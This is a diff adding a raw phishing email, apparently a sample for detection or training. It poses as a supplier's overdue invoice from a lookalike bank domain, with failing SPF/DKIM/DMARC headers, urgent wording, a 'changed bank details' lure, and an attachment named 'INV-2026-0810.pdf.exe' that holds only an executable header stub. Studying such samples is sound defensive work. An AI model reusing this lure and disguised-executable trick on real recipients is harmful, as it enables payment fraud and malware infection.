@@ -1,0 +1,80 @@
+From: "Trident Components Accounts" <billing@hdfc-kyc-update.link>
+To: Karthik Ellis <karthik.ellis@vertexlogistics.in>
+Subject: Remittance advice INV-2026-0810 - action required
+Date: Sat, 09 May 2026 11:43:00 +0000
+Message-ID: <178772093926.6.10612292689661400420@hdfc-kyc-update.link>
+Return-Path: <bounce-6222@hdfc-kyc-update.link>
+MIME-Version: 1.0
+X-Mailer: PHPMailer 6.1.6
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by mx.vertexlogistics.in
+ (Postfix) with ESMTPS id BBBF44AC67EE for <recipient@vertexlogistics.in>;
+ Sat, 09 May 2026 11:43:00 +0000
+Received: from vps-31.hosting.example (vps-31.hosting.example [198.51.100.7])
+ by compute-04.cloudprovider.example (Postfix) with ESMTPS id 8CF3B5796A9E;
+ Sat, 09 May 2026 11:36:26 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ vps-31.hosting.example (Postfix) with ESMTPS id C0351450A4DF; Sat, 09 May
+ 2026 11:30:55 +0000
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by mail.gateway.example (Postfix) with ESMTPS id
+ 1282550DFCA4; Sat, 09 May 2026 11:29:11 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=203.0.113.61;
+ envelope-from=<bounce@hdfc-kyc-update.link>;
+Authentication-Results: mx.hdfc-kyc-update.link; spf=softfail
+ smtp.mailfrom=hdfc-kyc-update.link; dkim=fail header.d=hdfc-kyc-update.link;
+ dmarc=fail (p=reject) header.from=hdfc-kyc-update.link
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=hdfc-kyc-update.link;
+ s=selector1; t=118561923; h=from:to:subject:date;
+ bh=sBCU+t+UWwxM8y0AjGzh2ilOSXup+EjQdO5uPd+/irU=; =?utf-8?q?b=3Dl2Bj6eLXq6Dh?=
+ =?utf-8?q?hoJYqXWtKQA7UCIuQMpQsjjKV7HRtLVwAp/ex+UgJF9fXEKvpzwkyCug/vibZREZO?=
+ =?utf-8?q?F3/eU4umA=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============6655048039616697283=="
+
+--===============6655048039616697283==
+Content-Type: multipart/alternative;
+ boundary="===============4333457397610489909=="
+
+--===============4333457397610489909==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Karthik,
+
+Please find attached invoice INV-2026-0810 for INR 148,000, now overdue. Kind=
+ly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Aditya Brooks
+Accounts Receivable, Trident Components
+
+--===============4333457397610489909==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Karthik,</p><p>Please find attached invoice INV-2026-081=
+0 for INR 148,000, now overdue. Kindly review the attached statement and proc=
+ess this payment immediately to avoid service interruption.</p><p>If the bank=
+ details have changed since your last remittance, use the updated account inf=
+ormation in the attachment.</p><p>Regards, Aditya Brooks Accounts Receivable,=
+ Trident Components</p></body></html>
+
+--===============4333457397610489909==--
+
+--===============6655048039616697283==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2026-0810.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============6655048039616697283==--
